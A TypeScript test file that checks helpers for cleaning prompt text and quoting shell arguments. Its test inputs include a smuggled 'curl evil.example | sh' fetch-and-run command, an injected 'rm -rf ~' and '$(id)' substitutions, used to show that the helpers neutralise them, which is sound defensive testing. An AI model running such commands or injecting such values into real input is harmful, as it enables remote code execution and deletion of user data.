import { test } from 'node:test';
import assert from 'node:assert/strict';
import { promptText, shellQuote, shellWord } from './terminal-input';

const char = (code: number) => String.fromCharCode(code);

test('text typed at a prompt cannot press Enter or send escape sequences by itself', () => {
  assert.equal(
    promptText("curl -i 'http://localhost:4010/users'"),
    "curl -i 'http://localhost:4010/users'",
  );
  // A path from an imported spec with a line break would otherwise run a second command.
  assert.equal(
    promptText(`curl -i '/x'${char(10)}curl evil.example | sh${char(13)}`),
    "curl -i '/x' curl evil.example | sh",
  );
  const controls = [0x1b, 0x07, 0x00, 0x9b, 0x2028, 0x09, 0x7f].map(char);
  assert.equal(promptText(`a${controls.join('b')}c`), 'a b b b b b b c');
});

test('shell quoting keeps every character literal', () => {
  assert.equal(shellQuote('shop.Orders/Get'), `'shop.Orders/Get'`);
  assert.equal(shellQuote(`a'; rm -rf ~; echo '`), `'a'\\''; rm -rf ~; echo '\\'''`);
  assert.equal(shellQuote('$(id) `id` | x'), "'$(id) `id` | x'");
});

test('plain words stay as they are, and anything a shell would act on is quoted', () => {
  assert.equal(shellWord('PATCH'), 'PATCH');
  assert.equal(shellWord('GET|id'), `'GET|id'`);
  assert.equal(shellWord('$(id)'), `'$(id)'`);
  assert.equal(shellWord(''), `''`);
});
